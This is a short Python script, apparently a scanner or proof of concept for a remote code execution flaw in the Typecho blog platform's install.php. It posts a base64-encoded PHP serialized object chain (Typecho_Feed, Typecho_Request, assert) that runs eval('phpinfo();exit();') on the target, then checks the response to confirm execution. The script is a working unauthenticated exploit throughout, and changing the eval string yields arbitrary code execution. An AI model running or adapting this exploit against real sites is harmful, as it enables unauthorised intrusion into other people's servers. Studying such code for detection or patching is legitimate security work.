import requests,re,urllib3,base64
from urllib import parse
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"install.php?finish"
	body="__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YToxOntzOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czoyNToiZXZhbCgncGhwaW5mbygpO2V4aXQoKTsnKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NToiYzF0YXMiO30="
	headers={"Referer": baseurl,"Content-Type": "application/x-www-form-urlencoded"}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "phpinfo()" in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
